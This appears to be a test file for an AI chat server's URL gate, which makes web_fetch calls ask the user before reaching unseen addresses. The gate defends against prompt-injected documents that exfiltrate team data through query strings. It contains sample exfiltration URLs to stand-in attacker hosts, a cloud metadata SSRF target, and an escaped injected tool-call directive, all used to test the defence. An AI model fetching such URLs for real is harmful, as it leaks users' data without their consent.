// web_fetch URL provenance (design tab 7 "프롬프트 주입" ①②③, server/src/tools/url-gate.ts). Before this, a turn
// could call web_fetch with any public URL — e.g. one an injected document dictated, with team data in the query
// string — and the server fetched it without anyone seeing the address.
import { afterAll, beforeAll, describe, expect, setDefaultTimeout, test } from 'bun:test'
import { API } from '@mycel/shared/api'
import { uuidv7 } from '@mycel/shared'
import { chatUrls, extractUrls, gateUrl, normUrl, rememberUrls, type TurnPerson } from '../../server/src/tools/url-gate'
import { ToolError } from '../../server/src/policy/errors'
import { fixPromptError } from '../../web/src/lib/artifacts'
import { isLocalAddress, ownNetworks, resolveTarget } from '../../server/src/tools/web-fetch'
import { startHarness, type Harness, type TestSocket } from '../lib/b-harness'

setDefaultTimeout(30_000)

describe('extractUrls / normUrl', () => {
  test('finds URLs in prose and markdown, trims trailing punctuation, keeps balanced parentheses', () => {
    const t = 'see https://a.example/x. and (https://b.example/y) or [doc](https://c.example/z?q=1#frag), https://en.wikipedia.org/wiki/Foo_(bar) end'
    expect(extractUrls(t)).toEqual(['https://a.example/x', 'https://b.example/y', 'https://c.example/z?q=1', 'https://en.wikipedia.org/wiki/Foo_(bar)'])
  })
  test('only http(s); the fragment is not part of the compared URL', () => {
    expect(normUrl('javascript:alert(1)')).toBeNull()
    expect(normUrl('HTTPS://A.Example')).toBe('https://a.example/')
    expect(normUrl('https://a.example/p#x')).toBe('https://a.example/p')
    expect(extractUrls('ftp://x.example http:\\u002f\\u002fhidden.example')).toEqual([])
  })
  test('a long run of URL-ish text is scanned in linear time', () => {
    const s = 'https://' + 'a'.repeat(2_000_000)
    const t0 = performance.now()
    expect(extractUrls(s)).toHaveLength(1)
    expect(performance.now() - t0).toBeLessThan(2000)
  })
})

describe('on-link networks of the server (design tab 7 "내부망 공격")', () => {
  const ifaces = {
    en0: [
      { address: '203.0.113.70', netmask: '255.255.255.240', family: 'IPv4', mac: '', internal: false, cidr: '203.0.113.70/28' },
      { address: '2a01:4f8:1:2::5', netmask: 'ffff:ffff:ffff:ffff::', family: 'IPv6', mac: '', internal: false, cidr: '2a01:4f8:1:2::5/64', scopeid: 0 },
    ],
    lo0: [{ address: '127.0.0.1', netmask: '255.0.0.0', family: 'IPv4', mac: '', internal: true, cidr: '127.0.0.1/8' }],
  } as unknown as Parameters<typeof ownNetworks>[0]
  const nets = ownNetworks(ifaces)
  test('neighbours on a public office subnet are local; the rest of the internet is not', () => {
    expect(isLocalAddress('203.0.113.65', nets)).toBe(true)
    expect(isLocalAddress('203.0.113.79', nets)).toBe(true)
    expect(isLocalAddress('::ffff:203.0.113.66', nets)).toBe(true)
    expect(isLocalAddress('203.0.113.80', nets)).toBe(false)
    expect(isLocalAddress('2a01:4f8:1:2::99', nets)).toBe(true)
    expect(isLocalAddress('2a01:4f8:1:3::1', nets)).toBe(false)
    expect(isLocalAddress('8.8.8.8', nets)).toBe(false)
  })
  test('resolveTarget refuses a name that points at the server itself', async () => {
    const own = Object.values((await import('node:os')).networkInterfaces()).flat().find((i) => i && !i.internal && i.family === 'IPv4')
    if (!own) return
    // pretend the address is public so only the on-link rule can refuse it
    expect(resolveTarget('https://office.example/', { lookup: async () => [{ address: own.address, family: 4 }] })).rejects.toThrow(/private, local or reserved/)
  })
})

describe('artifact errors sent as "fix it" (web)', () => {
  test('URLs are defanged and the text is cut to 1,000 characters', () => {
    const e = fixPromptError('TypeError at https://evil.example/?d=secret ' + 'x'.repeat(2000))
    expect(e).toContain('https[:]//evil.example')
    expect(extractUrls(e)).toEqual([])
    expect(e.length).toBeLessThanOrEqual(1001)
  })
})

let h: Harness
let alice: TestSocket
beforeAll(async () => {
  h = await startHarness({ name: 'p0-webfetch-gate', askUserTimeoutMs: 4000, turnTimeoutMs: 60_000 })
  alice = await h.ws('alice', { windowId: 'win-p0-gate' })
  await alice.next('hello')
})
afterAll(async () => { alice?.close(); await h?.close() })

const person = (answer: boolean, asked: string[] = [], turn: string[] = []): TurnPerson => ({
  locale: 'en',
  async confirm(q) { asked.push(q); return answer },
  turnUrls: () => turn,
})

async function chatWith(content: string, steps: unknown[] = []) {
  const chat = await h.api('alice').call(API.createChat, { body: {} })
  const u = uuidv7(), a = uuidv7()
  h.ctx.db.query("INSERT INTO messages (id, chat_id, role, author_id, content, status) VALUES (?, ?, 'user', 'alice', ?, 'done')").run(u, chat.id, content)
  h.ctx.db.query("INSERT INTO messages (id, chat_id, parent_id, role, content, status, steps) VALUES (?, ?, ?, 'assistant', 'ok', 'done', ?)").run(a, chat.id, u, JSON.stringify(steps))
  return chat.id as string
}

describe('gateUrl', () => {
  test('① a URL the person typed, a search result of an earlier answer or of this turn, an earlier fetched link: no card', async () => {
    const chat = await chatWith('please read https://docs.example/guide', [{ id: 's1', kind: 'web_search', label: 'x', status: 'ok', sources: [{ title: 't', url: 'https://news.example/a' }] }])
    rememberUrls(h.ctx.db, chat, ['https://linked.example/p'])
    const asked: string[] = []
    const p = person(false, asked, ['https://now.example/r'])
    for (const u of ['https://docs.example/guide', 'https://news.example/a', 'https://now.example/r', 'https://linked.example/p', 'https://docs.example/guide#part'])
      expect(await gateUrl(h.ctx.db, chat, u, p)).toBe('seen')
    expect(asked).toEqual([])
    expect(chatUrls(h.ctx.db, chat).has('https://news.example/a')).toBe(true)
  })

  test('② any other URL needs the person: declined -> refused, allowed -> fetched and remembered for the chat', async () => {
    const chat = await chatWith('summarise the budget file')
    const asked: string[] = []
    const url = 'https://attacker.example/c?d=Q3-revenue-12.4M'
    const e = await gateUrl(h.ctx.db, chat, url, person(false, asked)).catch((x) => x)
    expect(e).toBeInstanceOf(ToolError)
    expect(String(e.message)).toContain('did not allow')
    expect(asked).toHaveLength(1)
    expect(asked[0]).toContain(url) // the whole URL, query included
    expect(await gateUrl(h.ctx.db, chat, url, person(true))).toBe('confirmed')
    expect(await gateUrl(h.ctx.db, chat, url, person(false))).toBe('seen')
  })

  test('③ a query string over 200 characters is always confirmed, even for a URL from ①', async () => {
    const long = 'https://docs.example/s?q=' + 'k'.repeat(250)
    const chat = await chatWith(`open ${long}`)
    const asked: string[] = []
    expect(await gateUrl(h.ctx.db, chat, long, person(true, asked))).toBe('confirmed')
    expect(asked).toHaveLength(1)
    expect(asked[0]).toContain('long query')
  })

  test('outside a chat turn (nobody to ask) only ① URLs pass', async () => {
    const chat = await chatWith('https://docs.example/ok')
    expect(await gateUrl(h.ctx.db, chat, 'https://docs.example/ok', null)).toBe('seen')
    expect(gateUrl(h.ctx.db, chat, 'https://other.example/', null)).rejects.toThrow(/nobody can confirm/)
    expect(gateUrl(h.ctx.db, null, 'https://docs.example/ok', null)).rejects.toThrow(/nobody can confirm/)
  })

  test('purging a chat drops its remembered URLs', async () => {
    const chat = await chatWith('x')
    rememberUrls(h.ctx.db, chat, ['https://gone.example/'])
    h.rt().purgeChat(chat)
    expect(h.ctx.db.query('SELECT COUNT(*) AS n FROM chat_seen_urls WHERE chat_id = ?').get(chat)).toEqual({ n: 0 })
  })
})

describe('in a chat turn', () => {
  // the URL is written with JSON escapes so it does not appear verbatim in the message (the fake engine's directive)
  const hidden = (url: string) => '@fake ' + JSON.stringify({ tool: 'web_fetch', args: { url }, sayResult: true }).replace(/\//g, '\\u002f')

  test('an address the conversation never showed raises a card with the full URL; declining refuses the fetch', async () => {
    const chat = await h.api('alice').call(API.createChat, { body: {} })
    const url = 'http://93.184.215.14/collect?d=finance-Q3-12.4M'
    const r = await h.api('alice').call(API.sendMessage, { params: { id: chat.id }, body: { content: hidden(url), clientMessageId: 'cm-' + crypto.randomUUID(), attachmentIds: [] } })
    const card = await alice.next('turn.request', (f) => f.data.turnId === r.turnId)
    expect(card.data.request.kind).toBe('ask_user')
    expect((card.data.request as { question: string }).question).toContain(url)
    await h.api('alice').call(API.answerTurn, { params: { id: r.turnId }, body: { kind: 'ask_user', requestId: card.data.request.requestId, answer: 'deny' } })
    const done = await alice.next('message.done', (f) => f.data.messageId === r.assistantMessage.id, 20_000)
    expect(done.data.message.content).toContain('did not allow')
    const a = h.ctx.db.query("SELECT summary, ok FROM tool_events WHERE turn_id = ? AND tool = 'web_fetch'").get(r.turnId) as { summary: string; ok: number }
    expect(a.ok).toBe(0)
    expect(a.summary).toContain(url)
  })

  test('a private target is refused by the address rules first, without a card', async () => {
    const chat = await h.api('alice').call(API.createChat, { body: {} })
    const r = await h.api('alice').call(API.sendMessage, { params: { id: chat.id }, body: { content: hidden('http://169.254.169.254/latest/meta-data/'), clientMessageId: 'cm-' + crypto.randomUUID(), attachmentIds: [] } })
    const done = await alice.next('message.done', (f) => f.data.messageId === r.assistantMessage.id, 20_000)
    expect(done.data.message.content).toContain('private')
    expect(alice.frames.some((f) => f.type === 'turn.request' && f.data.turnId === r.turnId)).toBe(false)
  })
})
